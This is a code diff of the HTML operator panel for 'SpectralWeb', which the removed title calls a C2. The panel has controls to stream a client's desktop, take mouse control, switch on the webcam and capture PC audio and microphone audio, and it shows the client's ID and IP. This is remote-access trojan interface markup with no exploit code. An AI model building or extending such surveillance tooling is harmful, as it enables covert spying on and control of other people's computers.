@@ -3,105 +3,112 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Client Control Panel - SpectralWeb C2</title>
+    <title>SpectralWeb - Client Control</title>
 
     <script src="../auth/auth_check.js"></script>
 
-    <link rel="stylesheet" href="css/client_control.css">
+    <link rel="stylesheet" href="css/base.css">
+    <link rel="stylesheet" href="css/layout.css">
+    <link rel="stylesheet" href="css/components.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
-    <div class="sidebar" id="sidebar">
-        <div class="menu-toggle" id="menuToggle">
-            <i class="fas fa-bars"></i>
-        </div>
-        <div class="icons">
-            <div class="icon active" data-function="desktop" title="Remote Desktop">
+
+    <aside class="sidebar" id="sidebar">
+        <div class="sidebar-content">
+            <div class="nav-item active" data-target="desktop" title="Desktop">
                 <i class="fas fa-desktop"></i>
-                <span class="icon-label">Remote Desktop</span>
+                <span class="nav-label">Desktop</span>
             </div>
-            <div class="icon" data-function="webcam" title="Webcam">
+            <div class="nav-item" data-target="webcam" title="Webcam">
                 <i class="fas fa-video"></i>
-                <span class="icon-label">Webcam</span>
-            </div>
-            <div class="icon audio-output" data-function="audio-output" title="Audio Output">
-                <i class="fas fa-volume-up"></i>
-                <span class="icon-label">Audio Output</span>
-            </div>
-            <div class="icon audio-input" data-function="audio-input" title="Audio Input">
-                <i class="fas fa-microphone"></i>
-                <span class="icon-label">Audio Input</span>
+                <span class="nav-label">Webcam</span>
             </div>
         </div>
+
+        <div class="sidebar-tab" id="sidebarToggle">
+            <i class="fas fa-chevron-left"></i>
+        </div>
+    </aside>
+
+    <div class="app-main">
+        <header class="header" id="header" data-active-mode="desktop">
+
+            <div class="header-left">
+                <div class="control-group for-desktop">
+                    <button id="btn-desktop-stream" class="action-btn" title="Start/Stop Stream">
+                        <i class="fas fa-play"></i>
+                    </button>
+                    <button id="btn-desktop-control" class="action-btn" title="Take Control">
+                        <i class="fas fa-mouse-pointer"></i>
+                    </button>
+                </div>
+
+                <div class="control-group for-webcam">
+                    <button id="btn-webcam-stream" class="action-btn" title="Toggle Webcam">
+                        <i class="fas fa-camera"></i>
+                    </button>
+                </div>
+
+                <div class="control-group global">
+                    <div class="divider"></div>
+                    <button id="btn-audio-pc" class="action-btn" title="PC Sound">
+                        <i class="fas fa-volume-up"></i>
+                    </button>
+                    <button id="btn-audio-mic" class="action-btn" title="Microphone">
+                        <i class="fas fa-microphone"></i>
+                    </button>
+                </div>
+            </div>
+
+            <div class="header-right">
+                <div class="meta-item">
+                    <span class="meta-label">ID:</span>
+                    <span id="display-id" class="meta-value">unknown</span>
+                </div>
+
+                <div class="meta-item">
+                    <span class="meta-label">IP:</span>
+                    <span id="display-ip" class="meta-value">0.0.0.0</span>
+                </div>
+
+                <div class="meta-item status-wrapper">
+                    <span id="status-text" class="status-label">offline</span>
+                    <div id="status-indicator" class="status-dot"></div>
+                </div>
+            </div>
+        </header>
+
+        <main class="workspace">
+            <div id="view-desktop" class="view-panel active">
+                <div class="canvas-wrapper" id="wrapper-desktop">
+                    <canvas id="desktopCanvas"></canvas>
+
+                    <button class="fullscreen-btn" title="Toggle Fullscreen" data-target="wrapper-desktop">
+                        <i class="fas fa-expand"></i>
+                    </button>
+
+                    <div class="stream-overlay">
+                        <p>No Desktop Data</p>
+                    </div>
+                </div>
+            </div>
+
+            <div id="view-webcam" class="view-panel">
+                <div class="canvas-wrapper" id="wrapper-webcam">
+                    <canvas id="webcamCanvas"></canvas>
+
+                    <button class="fullscreen-btn" title="Toggle Fullscreen" data-target="wrapper-webcam">
+                        <i class="fas fa-expand"></i>
+                    </button>
+
+                    <div class="stream-overlay">
+                        <p>Webcam Inactive</p>
+                    </div>
+                </div>
+            </div>
+        </main>
     </div>
-
-    <div class="main-content" id="mainContent">
-        <div class="header">
-            <h1 class="title">Client Control Panel</h1>
-            <div class="client-info">
-                <div class="info-item">
-                    <span class="label">Client ID:</span>
-                    <span class="value" id="clientId">Loading...</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Status:</span>
-                    <span class="value status-offline" id="clientStatus">offline</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">IP:</span>
-                    <span class="value" id="clientIp">Loading...</span>
-                </div>
-            </div>
-        </div>
-
-        <div class="desktop-container" id="desktopContainer">
-          <div class="desktop-controls">
-            <button class="control-btn observe-off" id="observeBtn">
-              <i class="fas fa-eye"></i> Observation: <span>OFF</span>
-            </button>
-            <button class="control-btn control-off" id="controlBtn">
-              <i class="fas fa-mouse-pointer"></i> Take Control: <span id="controlStatus">OFF</span>
-            </button>
-          </div>
-
-          <div class="desktop-display">
-            <video id="desktopVideo" class="desktop-feed" autoplay playsinline muted style="display:none"></video>
-            <div class="desktop-placeholder" id="desktopPlaceholder" style="display:block">
-              <h3>Remote Desktop Feed</h3>
-              <p>Waiting for stream...</p>
-            </div>
-          </div>
-        </div>
-
-        <div class="webcam-container" id="webcamContainer" style="display: none;">
-            <div class="webcam-controls">
-                <button class="control-btn webcam-off" id="webcamToggleBtn">
-                    <i class="fas fa-video"></i> Webcam: <span id="webcamStatus">OFF</span>
-                </button>
-            </div>
-
-            <div class="webcam-display">
-                <video id="webcamFeed" class="webcam-feed" autoplay muted style="display:none"></video>
-                <div class="webcam-placeholder" id="webcamPlaceholder" style="display:block">
-                    <h3>Webcam Feed</h3>
-                    <p>Click toggle to start webcam...</p>
-                </div>
-            </div>
-        </div>
-
-        <div class="function-container" id="functionContainer" style="display: none;">
-            <div class="welcome-message">
-                <h2>Select a function from the sidebar</h2>
-                <p>Choose an action from the left menu to control the client</p>
-            </div>
-        </div>
-    </div>
-
-    <!-- Подключение всех JS файлов в правильном порядке -->
-    <script src="js/modules/core/states.js"></script>
-    <script src="js/modules/features/desktop.js"></script>
-    <script src="js/modules/features/webcam.js"></script>
-    <script src="js/modules/features/audio_control.js"></script>
 
     <script type="module" src="js/client_control.js"></script>
 </body>
